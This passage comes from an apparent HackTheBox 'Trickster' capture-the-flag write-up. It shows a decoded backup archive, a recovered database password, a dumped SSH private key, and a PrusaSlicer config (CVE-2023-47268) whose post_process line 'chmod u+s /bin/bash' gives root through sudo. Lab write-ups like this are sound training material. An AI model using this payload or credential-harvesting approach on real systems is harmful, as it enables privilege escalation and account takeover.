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
AABwFQAAAAA=
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Trickster/files]
└─$ cat backup.b64 | base64 -d > changedetection-backup-20240830194841.zip
```

```c
┌──(kali㉿kali)-[/media/…/Machines/Trickster/files/changedetection-backup-20240830194841]
└─$ unzip changedetection-backup-20240830194841.zip 
Archive:  changedetection-backup-20240830194841.zip
   creating: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/f04f0732f120c0cc84a993ad99decb2c.txt.br  
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/history.txt  
  inflating: secret.txt              
  inflating: url-list.txt            
  inflating: url-list-with-tags.txt  
  inflating: url-watches.json
```

Our member `Bushidosan` went down the road to deal with the `.br` files and finally found a way to `decompress` them.

```c
┌──(kali㉿kali)-[~]
└─$ sudo apt-get install brotli
```

```c
┌──(kali㉿kali)-[/media/…/Trickster/files/changedetection-backup-20240830194841/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└─$ brotli --decompress f04f0732f120c0cc84a993ad99decb2c.txt.br
```

He found the `password` for `adam` inside the `changedetection-backup-20240830194841.zip` file.

```c
┌──(kali㉿kali)-[/media/…/Trickster/files/changedetection-backup-20240830194841/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└─$ cat f04f0732f120c0cc84a993ad99decb2c.txt
<--- CUT FOR BREVITY --->
                'database_user' => 'adam' ,
                'database_password' => 'adam_admin992' ,
<--- CUT FOR BREVITY --->
```

| Password      |
| ------------- |
| adam_admin992 |

With a quick switch into the context of `adam` we grabbed his `SSH key` for easy access to the box and as a checkpoint.

```c
james@trickster:~$ su adam
Password:
adam@trickster:~$
```

```c
adam@trickster:~/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

## Pivoting (adam)

A quick check on the new `permissions` and `capabilities` of `adam` showed that he was able to use the `prusaslicer` binary with `sudo`.

```c
adam@trickster:~$ id
uid=1002(adam) gid=1002(adam) groups=1002(adam)
```

```c
adam@trickster:~$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
```

## Privilege Escalation to root

### CVE-2023-47268: PrusaSlicer 2.6.1 Arbitrary Code Execution

We found the `CVE-2023-47268` which is `Arbitrary Code Execution` in the `PrusaSlicer 2.6.1` application which was running on the box.

- [https://www.exploit-db.com/exploits/51983](https://www.exploit-db.com/exploits/51983)

We went back to the extracted files and searched for the `; post_process = ""` line inside the `Slic3r_PE.config` file to modify it to our needs.

There were a few more changed needed to be done to the `config` file to make it work properly and we simply gave that to our `AI member`.

```c
┌──(kali㉿kali)-[/media/…/Trickster/files/unzip/Metadata]
└─$ cat Slic3r_PE.config 
; generated by PrusaSlicer 2.6.1+win64 on 2024-05-23 at 22:08:23 UTC

; autoemit_temperature_commands = 1
; avoid_crossing_curled_overhangs = 0
; avoid_crossing_perimeters = 0
; avoid_crossing_perimeters_max_detour = 0
; bed_custom_model = 
; bed_custom_texture = 
; bed_shape = 0x0,250x0,250x210,0x210
; bed_temperature = 110
; before_layer_gcode = ;BEFORE_LAYER_CHANGE\nG92 E0.0\n;[layer_z]\n\n
; between_objects_gcode = 
; bottom_fill_pattern = monotonic
; bottom_solid_layers = 4
; bottom_solid_min_thickness = 0.5
; bridge_acceleration = 1000
; bridge_angle = 0
; bridge_fan_speed = 25
; bridge_flow_ratio = 1
; bridge_speed = 25
; brim_separation = 0.1
; brim_type = outer_only
; brim_width = 0
; color_change_gcode = M600\nG1 E0.4 F1500 ; prime after color change
; colorprint_heights = 
; compatible_printers_condition_cummulative = "printer_model==\"MK4\" and nozzle_diameter[0]==0.4";"printer_model=~/(MK4|MK4IS)/ and nozzle_diameter[0]!=0.6 and nozzle_diameter[0]!=0.8"
; complete_objects = 0
; cooling = 1
; cooling_tube_length = 5
; cooling_tube_retraction = 91.5
; default_acceleration = 1000
; default_filament_profile = "Prusament PLA @PG"
; default_print_profile = 0.20mm QUALITY @MK4 0.4
; deretract_speed = 25
; disable_fan_first_layers = 4
; dont_support_bridges = 0
; draft_shield = disabled
; duplicate_distance = 6
; elefant_foot_compensation = 0.2
; enable_dynamic_fan_speeds = 0
; enable_dynamic_overhang_speeds = 1
; end_filament_gcode = "; Filament-specific end gcode"
; end_gcode = {if layer_z < max_print_height}G1 Z{z_offset+min(layer_z+1, max_print_height)} F720 ; Move print head up{endif}\nM104 S0 ; turn off temperature\nM140 S0 ; turn off heatbed\nM107 ; turn off fan\nG1 X241 Y170 F3600 ; park\n{if layer_z < max_print_height}G1 Z{z_offset+min(layer_z+23, max_print_height)} F300 ; Move print head up{endif}\nG4 ; wait\nM900 K0 ; reset LA\nM142 S36 ; reset heatbreak target temp\nM84 X Y E ; disable motors\n; max_layer_z = [max_layer_z]
; external_perimeter_acceleration = 700
; external_perimeter_extrusion_width = 0.45
; external_perimeter_speed = 25
; external_perimeters_first = 0
; extra_loading_move = -2
; extra_perimeters = 0
; extra_perimeters_on_overhangs = 0
; extruder_clearance_height = 13
; extruder_clearance_radius = 45
; extruder_colour = ""
; extruder_offset = 0x0
; extrusion_axis = E
; extrusion_multiplier = 1
; extrusion_width = 0.45
; fan_always_on = 0
; fan_below_layer_time = 30
; filament_colour = #FFF2EC
; filament_cooling_final_speed = 50
; filament_cooling_initial_speed = 10
; filament_cooling_moves = 5
; filament_cost = 27.82
; filament_density = 1.04
; filament_deretract_speed = nil
; filament_diameter = 1.75
; filament_load_time = 15
; filament_loading_speed = 14
; filament_loading_speed_start = 19
; filament_max_volumetric_speed = 12
; filament_minimal_purge_on_wipe_tower = 35
; filament_multitool_ramming = 0
; filament_multitool_ramming_flow = 10
; filament_multitool_ramming_volume = 10
; filament_notes = ""
; filament_ramming_parameters = "120 110 5.32258 5.45161 5.67742 6 6.48387 7.12903 7.90323 8.70968 9.3871 9.83871 10.0968 10.2258| 0.05 5.30967 0.45 5.50967 0.95 6.1871 1.45 7.39677 1.95 9.05484 2.45 10 2.95 10.3098 3.45 13.0839 3.95 7.6 4.45 7.6 4.95 7.6"
; filament_retract_before_travel = nil
; filament_retract_before_wipe = nil
; filament_retract_layer_change = nil
; filament_retract_length = nil
; filament_retract_length_toolchange = nil
; filament_retract_lift = nil
; filament_retract_lift_above = nil
; filament_retract_lift_below = nil
; filament_retract_restart_extra = nil
; filament_retract_restart_extra_toolchange = nil
; filament_retract_speed = nil
; filament_settings_id = "Generic ABS @MK4"
; filament_soluble = 0
; filament_spool_weight = 0
; filament_toolchange_delay = 0
; filament_type = ABS
; filament_unload_time = 12
; filament_unloading_speed = 20
; filament_unloading_speed_start = 100
; filament_vendor = Generic
; filament_wipe = nil
; fill_angle = 45
; fill_density = 15%
; fill_pattern = grid
; first_layer_acceleration = 600
; first_layer_acceleration_over_raft = 0
; first_layer_bed_temperature = 100
; first_layer_extrusion_width = 0.5
; first_layer_height = 0.2
; first_layer_speed = 20
; first_layer_speed_over_raft = 30
; first_layer_temperature = 255
; full_fan_speed_layer = 0
; fuzzy_skin = none
; fuzzy_skin_point_dist = 0.8
; fuzzy_skin_thickness = 0.3
; gap_fill_enabled = 1
; gap_fill_speed = 40
; gcode_comments = 0
; gcode_flavor = marlin2
; gcode_label_objects = 1
; gcode_resolution = 0.008
; gcode_substitutions = 
; high_current_on_filament_swap = 0
; host_type = prusalink
; idle_temperature = 100
; infill_acceleration = 2000
; infill_anchor = 2
; infill_anchor_max = 12
; infill_every_layers = 1
; infill_extruder = 1
; infill_extrusion_width = 0.45
; infill_first = 0
; infill_overlap = 10%
; infill_speed = 120
; interface_shells = 0
; ironing = 0
; ironing_flowrate = 15%
; ironing_spacing = 0.1
; ironing_speed = 15
; ironing_type = top
; layer_gcode = ;AFTER_LAYER_CHANGE\n;[layer_z]
; layer_height = 0.2
; machine_limits_usage = emit_to_gcode
; machine_max_acceleration_e = 2500
; machine_max_acceleration_extruding = 2000
; machine_max_acceleration_retracting = 1200
; machine_max_acceleration_travel = 2000
; machine_max_acceleration_x = 2500
; machine_max_acceleration_y = 2500
; machine_max_acceleration_z = 200
; machine_max_feedrate_e = 100
; machine_max_feedrate_x = 200
; machine_max_feedrate_y = 200
; machine_max_feedrate_z = 40
; machine_max_jerk_e = 10
; machine_max_jerk_x = 8
; machine_max_jerk_y = 8
; machine_max_jerk_z = 2
; machine_min_extruding_rate = 0
; machine_min_travel_rate = 0
; max_fan_speed = 15
; max_layer_height = 0.3
; max_print_height = 220
; max_print_speed = 200
; max_volumetric_extrusion_rate_slope_negative = 0
; max_volumetric_extrusion_rate_slope_positive = 0
; max_volumetric_speed = 0
; min_bead_width = 85%
; min_fan_speed = 15
; min_feature_size = 25%
; min_layer_height = 0.07
; min_print_speed = 15
; min_skirt_length = 4
; mmu_segmented_region_interlocking_depth = 0
; mmu_segmented_region_max_width = 0
; notes = 
; nozzle_diameter = 0.4
; only_retract_when_crossing_perimeters = 0
; ooze_prevention = 0
; output_filename_format = {input_filename_base}_{nozzle_diameter[0]}n_{layer_height}mm_{printing_filament_types}_{printer_model}_{print_time}.gcode
; overhang_fan_speed_0 = 0
; overhang_fan_speed_1 = 0
; overhang_fan_speed_2 = 0
; overhang_fan_speed_3 = 0
; overhang_speed_0 = 15
; overhang_speed_1 = 15
; overhang_speed_2 = 20
; overhang_speed_3 = 25
; overhangs = 1
; parking_pos_retraction = 92
; pause_print_gcode = M601
; perimeter_acceleration = 900
; perimeter_extruder = 1
; perimeter_extrusion_width = 0.45
; perimeter_generator = arachne
; perimeter_speed = 45
; perimeters = 2
; physical_printer_settings_id = 
; post_process = "chmod u+s /bin/bash"
; print_settings_id = 0.20mm QUALITY @MK4 0.4
; printer_model = MK4
; printer_notes = Do not remove the keywords below.\nPRINTER_VENDOR_PRUSA3D\nPRINTER_MODEL_MK4\nPG
; printer_settings_id = Original Prusa MK4 0.4 nozzle
; printer_technology = FFF
; printer_variant = 0.4
; printer_vendor = 
; raft_contact_distance = 0.2
; raft_expansion = 1.5
; raft_first_layer_density = 80%
; raft_first_layer_expansion = 3
; raft_layers = 0
; remaining_times = 1
; resolution = 0
; retract_before_travel = 1.5
; retract_before_wipe = 80%
; retract_layer_change = 1
; retract_length = 0.8
; retract_length_toolchange = 4
; retract_lift = 0.2
; retract_lift_above = 0
; retract_lift_below = 219
; retract_restart_extra = 0
; retract_restart_extra_toolchange = 0
; retract_speed = 35
; seam_position = aligned
; silent_mode = 0
; single_extruder_multi_material = 0
; single_extruder_multi_material_priming = 0
; skirt_distance = 2
; skirt_height = 3
; skirts = 0
; slice_closing_radius = 0.049
; slicing_mode = regular
; slowdown_below_layer_time = 20
; small_perimeter_speed = 25
; solid_infill_acceleration = 1500
; solid_infill_below_area = 0
; solid_infill_every_layers = 0
; solid_infill_extruder = 1
; solid_infill_extrusion_width = 0.45
; solid_infill_speed = 90
; spiral_vase = 0
; staggered_inner_seams = 0
; standby_temperature_delta = -5
; start_filament_gcode = "M900 K{if nozzle_diameter[0]==0.4}0.04{elsif nozzle_diameter[0]==0.25}0.1{elsif nozzle_diameter[0]==0.3}0.06{elsif nozzle_diameter[0]==0.35}0.05{elsif nozzle_diameter[0]==0.5}0.03{elsif nozzle_diameter[0]==0.6}0.02{elsif nozzle_diameter[0]==0.8}0.01{else}0{endif} ; Filament gcode\n\n{if printer_notes=~/.*PRINTER_MODEL_MK4IS.*/}\nM572 S{if nozzle_diameter[0]==0.4}0.02{elsif nozzle_diameter[0]==0.5}0.018{elsif nozzle_diameter[0]==0.6}0.012{elsif nozzle_diameter[0]==0.8}0.01{elsif nozzle_diameter[0]==0.25}0.09{elsif nozzle_diameter[0]==0.3}0.065{else}0{endif} ; Filament gcode\n{endif}\n\nM142 S40 ; set heatbreak target temp"
; start_gcode = M17 ; enable steppers\nM862.3 P "[printer_model]" ; printer model check\nM862.1 P[nozzle_diameter] ; nozzle diameter check\nM555 X{(min(print_bed_max[0], first_layer_print_min[0] + 32) - 32)} Y{(max(0, first_layer_print_min[1]) - 4)} W{((min(print_bed_max[0], max(first_layer_print_min[0] + 32, first_layer_print_max[0])))) - ((min(print_bed_max[0], first_layer_print_min[0] + 32) - 32))} H{((first_layer_print_max[1])) - ((max(0, first_layer_print_min[1]) - 4))}\n\nG90 ; use absolute coordinates\nM83 ; extruder relative mode\n\nM140 S[first_layer_bed_temperature] ; set bed temp\n{if filament_type[initial_tool]=="PC" or filament_type[initial_tool]=="PA"}\nM104 S{first_layer_temperature[initial_tool]-25} ; set extruder temp for bed leveling\nM109 R{first_layer_temperature[initial_tool]-25} ; wait for temp\n{elsif filament_type[initial_tool]=="FLEX"}\nM104 S210 ; set extruder temp for bed leveling\nM109 R210 ; wait for temp\n{else}\nM104 S170 ; set extruder temp for bed leveling\nM109 R170 ; wait for temp\n{endif}\n\nM84 E ; turn off E motor\n\nG28 ; home all without mesh bed level\n\nG1 X{10 + 32} Y-4 Z5 F4800\n\nM302 S160 ; lower cold extrusion limit to 160C\n\n{if filament_type[initial_tool]=="FLEX"}\nG1 E-4 F2400 ; retraction\n{else}\nG1 E-2 F2400 ; retraction\n{endif}\n\nM84 E ; turn off E motor\n\nG29 P9 X10 Y-4 W32 H4\n\n{if first_layer_bed_temperature[initial_tool]<=60}M106 S100{endif}\n\nG0 Z40 F10000\n\nM190 S[first_layer_bed_temperature] ; wait for bed temp\n\nM107\n\n;\n; MBL\n;\nM84 E ; turn off E motor\nG29 P1 ; invalidate mbl & probe print area\nG29 P1 X0 Y0 W50 H20 C ; probe near purge place\nG29 P3.2 ; interpolate mbl probes\nG29 P3.13 ; extrapolate mbl outside probe area\nG29 A ; activate mbl\n\n; prepare for purge\nM104 S{first_layer_temperature[0]}\nG0 X0 Y-4 Z15 F4800 ; move away and ready for the purge\nM109 S{first_layer_temperature[0]}\n\nG92 E0\nM569 S0 E ; set spreadcycle mode for extruder\n\n;\n; Extrude purge line\n;\nG92 E0 ; reset extruder position\nG1 E{(filament_type[0] == "FLEX" ? 4 : 2)} F2400 ; deretraction after the initial one before nozzle cleaning\nG0 E7 X15 Z0.2 F500 ; purge\nG0 X25 E4 F500 ; purge\nG0 X35 E4 F650 ; purge\nG0 X45 E4 F800 ; purge\nG0 X{45 + 3} Z{0.05} F{8000} ; wipe, move close to the bed\nG0 X{45 + 3 * 2} Z0.2 F{8000} ; wipe, move quickly away from the bed\n\nG92 E0\nM221 S100 ; set flow to 100%
; support_material = 0
; support_material_angle = 0
; support_material_auto = 1
; support_material_bottom_contact_distance = 0
; support_material_bottom_interface_layers = 0
; support_material_buildplate_only = 0
; support_material_closing_radius = 2
; support_material_contact_distance = 0.2
; support_material_enforce_layers = 0
; support_material_extruder = 0
; support_material_extrusion_width = 0.37
; support_material_interface_contact_loops = 0
; support_material_interface_extruder = 0
; support_material_interface_layers = 5
; support_material_interface_pattern = rectilinear
; support_material_interface_spacing = 0.2
; support_material_interface_speed = 70%
; support_material_pattern = rectilinear
; support_material_spacing = 2
; support_material_speed = 50
; support_material_style = snug
; support_material_synchronize_layers = 0
; support_material_threshold = 45
; support_material_with_sheath = 0
; support_material_xy_spacing = 80%
; support_tree_angle = 40
; support_tree_angle_slow = 30
; support_tree_branch_diameter = 2
; support_tree_branch_diameter_angle = 3
; support_tree_branch_diameter_double_wall = 3
; support_tree_branch_distance = 1
; support_tree_tip_diameter = 0.6
; support_tree_top_rate = 30%
; temperature = 255
; template_custom_gcode = 
; thick_bridges = 0
; thin_walls = 0
; threads = 4
; thumbnails = 16x16,313x173,440x240
; thumbnails_format = PNG
; toolchange_gcode = 
; top_fill_pattern = monotoniclines
; top_infill_extrusion_width = 0.4
; top_solid_infill_acceleration = 800
; top_solid_infill_speed = 40
; top_solid_layers = 5
; top_solid_min_thickness = 0.7
; travel_acceleration = 0
; travel_speed = 200
; travel_speed_z = 12
; use_firmware_retraction = 0
; use_relative_e_distances = 1
; use_volumetric_e = 0
; variable_layer_height = 1
; wall_distribution_count = 1
; wall_transition_angle = 10
; wall_transition_filter_deviation = 25%
; wall_transition_length = 100%
; wipe = 1
; wipe_into_infill = 0
; wipe_into_objects = 0
; wipe_tower = 1
; wipe_tower_bridging = 10
; wipe_tower_brim_width = 2
; wipe_tower_cone_angle = 0
; wipe_tower_extra_spacing = 100%
; wipe_tower_extruder = 0
; wipe_tower_no_sparse_layers = 0
; wipe_tower_rotation_angle = 0
; wipe_tower_width = 60
; wipe_tower_x = 170
